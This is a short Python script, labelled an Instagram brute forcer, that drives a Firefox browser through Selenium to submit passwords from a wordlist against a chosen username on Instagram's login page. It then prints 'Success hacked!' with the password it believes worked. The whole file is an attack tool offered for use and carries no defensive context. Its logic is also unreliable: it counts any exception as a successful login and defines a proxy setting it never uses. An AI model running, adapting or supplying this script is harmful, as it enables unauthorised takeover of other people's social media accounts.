import os, sys, time
from selenium import webdriver
from selenium.webdriver.common.by import By 
from selenium.webdriver.common.keys import Keys

#Author ProgMan0

os.system('clear')
banner = '''.___                 __        __________                __          
|   | ____   _______/  |______ \______   \_______ __ ___/  |_  ____  
|   |/    \ /  ___/\   __\__  \ |    |  _/\_  __ \  |  \   __\/ __ \ 
|   |   |  \\___ \  |  |  / __ \|    |   \ |  | \/  |  /|  | \  ___/ 
|___|___|  /____  > |__| (____  /______  / |__|  |____/ |__|  \___  >
         \/     \/            \/       \/                         \/ 
  Instagram Brute Forcer v0.1, Author: progman0 (Github/Telegram)\n '''

colors = ['\33[31m', '\33[0m', '\033[96m']

def commands(input_, button, ll):
	input_.send_keys(ll)
	button.click()
	input_.send_keys(Keys.CONTROL, 'a')
	input_.send_keys(Keys.BACKSPACE)
	time.sleep(4)

def bruteforce(username, passwords):
	driver = webdriver.Firefox(executable_path='your/path')
	driver.get('https://www.instagram.com/')

	time.sleep(4)

	if len(passwords) > 1:
		inputs = driver.find_elements(By.TAG_NAME, 'input')
		input_ = [x for x in inputs if x]

		input_[0].send_keys(username)

		proxies = {
			'https:' : 'https://exapmle.com:8080'
		}

		block = driver.find_elements(By.CLASS_NAME, 'x9f619')
		button = block[1].find_element(By.TAG_NAME, 'button')

		for ll in passwords:
			if len(ll) > 3:
				try:
					print(colors[2] + 'Checking password >> ' + ll + colors[1])
					commands(input_[1], button, ll)
					time.sleep(1)
				except Exception as ex:
					index = passwords.index(ll)
					print(colors[2] + f'Success hacked!\nLogin >> {username}\nPassword >> {passwords[index-1]}')
					break
def run():
	print(banner)
	username = input(colors[2] + 'Username account >> ' + colors[1])
	if username:
		list_ = input(colors[2] + 'Password list (Enter to default list) >> ' + colors[1])
		if list_ == '':
			with open('passwords.txt') as passwords:
				list_ = passwords.read().split('\n')	
				bruteforce(username=username, passwords=list_)
		else:
			try:
				with open(list_) as passwords:
					list_ = passwords.read().split('\n')
					bruteforce(username=username, passwords=list_)
			except FileNotFoundError as ex:
				print(colors[0] + 'Error: file not found!')
				sys.exit()		
run()	
